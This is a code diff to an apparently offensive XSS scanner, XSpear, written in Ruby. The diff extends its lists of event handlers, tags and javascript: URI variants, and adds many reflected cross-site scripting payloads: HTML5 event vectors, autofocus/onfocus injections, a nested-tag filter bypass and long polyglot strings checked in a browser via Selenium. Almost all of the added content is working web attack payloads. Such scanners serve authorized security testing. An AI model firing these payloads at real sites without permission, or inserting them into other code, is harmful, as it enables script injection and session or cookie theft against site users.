@@ -247,6 +247,7 @@ class XspearScan
         'onKeyUp',
         'onLayoutComplete',
         'onLoad',
+        'onloadstart',
         'onLoseCapture',
         'onMediaComplete',
         'onMediaError',
@@ -297,7 +298,10 @@ class XspearScan
         'onTrackChange',
         'onUndo',
         'onUnload',
-        'onURLFlip'
+        'onURLFlip',
+        'ontouchstart',
+        'ontouchend',
+        'ontouchmove'
     ]
     tags = [
         "script",
@@ -308,10 +312,11 @@ class XspearScan
         "audio",
         "meta",
         "object",
-        "embeded",
+        "embed",
         "style",
         "frame",
-        "frameset"
+        "frameset",
+        "applet"
     ]
     special_chars =[
         ">",
@@ -335,6 +340,24 @@ class XspearScan
         "=",
         "$"
     ]
+    useful_code = [
+        "javascript:",
+        "JaVasCriPt:",
+        "jaVas%0dcRipt:",
+        "jaVas%0acRipt:",
+        "jaVas%09cRipt:",
+        "data:",
+        "alert(",
+        "alert`",
+        "prompt(",
+        "prompt`",
+        "confirm(",
+        "confirm`",
+        "document.location",
+        "document.cookie",
+        "window.location"
+    ]
+
 
     log('s', 'creating a test query.')
     r.push makeQueryPattern('s', '', '', 'i', "-", CallbackCheckHeaders)
@@ -357,16 +380,42 @@ class XspearScan
     end
 
     # Check Common XSS Payloads
+    onfocus_tags = [
+        "input",
+        "select",
+        "textarea",
+        "keygen"
+    ]
     r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '<svg/onload=alert(45)>', '<svg/onload=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '<img/src onerror=alert(45)>', '<img/src onerror=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
+    r.push makeQueryPattern('x', '"><scr<script>ipt>alert(45)</scr<script>ipt>', '<script>alert(45)</script>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '"><iframe/src=JavaScriPt:alert(45)>', '"><iframe/src=JavaScriPt:alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
+    r.push makeQueryPattern('x', '"\'><video/poster/onerror=alert(45)>', '<video/poster/onerror=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
+    r.push makeQueryPattern('x', '"\'><details/open/ontoggle="alert`45`">', '<details/open/ontoggle="alert`45`">', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
+    r.push makeQueryPattern('x', '"\'><audio src onloadstart=alert(45)>', '<audio src onloadstart=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
+    r.push makeQueryPattern('x', '"\'><marquee onstart=alert(45)>', '<marquee onstart=alert(45)>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
+    r.push makeQueryPattern('x', '"\'><meter value=2 min=0 max=10 onmouseover=alert(45)>2 out of 10</meter>', '<meter value=2 min=0 max=10 onmouseover=alert(45)>2 out of 10</meter>', 'h', "reflected "+"HTML5 XSS Code".red, CallbackStringMatch)
+
+    onfocus_tags.each do |t|
+      r.push makeQueryPattern('x', "\"'><#{t} autofocus onfocus=alert(45)>", "<#{t} autofocus onfocus=alert(45)>", 'h', "reflected "+"onfocus XSS Code".red, CallbackStringMatch)
+    end
+
+    # Check Selenium Payloads
     r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'v', "triggered "+"<script>alert(45)</script>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '"><svgonload=alert(1)>', '<svgonload=alert(1)>', 'v', "triggered "+"<svgonload=alert(1)>  (x0c)".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', '<xmp><p title="</xmp><svg/onload=alert(45)>">', '<xmp><p title="</xmp><svg/onload=alert(45)>">', 'v', "triggered "+"<xmp><p title='</xmp><svg/onload=alert(45)>'>".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', '\'"><svg/onload=alert(45)>', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"<svg/onload=alert(45)>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '"\'><video/poster/onerror=alert(45)>', '<video/poster/onerror=alert(45)>', 'h', "triggered "+"<video/poster/onerror=alert(45)>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '"\'><details/open/ontoggle="alert(45)">', '<details/open/ontoggle="alert(45)">', 'h', "triggered "+"<details/open/ontoggle=\"alert(45)\">".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '"\'><audio src onloadstart=alert(45)>', '<audio src onloadstart=alert(45)>', 'h', "triggered "+"<audio src onloadstart=alert(45)>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '"\'><marquee onstart=alert(45)>', '<marquee onstart=alert(45)>', 'h', "triggered "+"<marquee onstart=alert(45)>".red, CallbackXSSSelenium)
+
+    # Check Selenium Polyglot
     r.push makeQueryPattern('x', 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', 'javascript:"/*`/*\"/*\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(45)//>', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)
+
 
     # Check Blind XSS Payload
     if !@blind_url.nil?
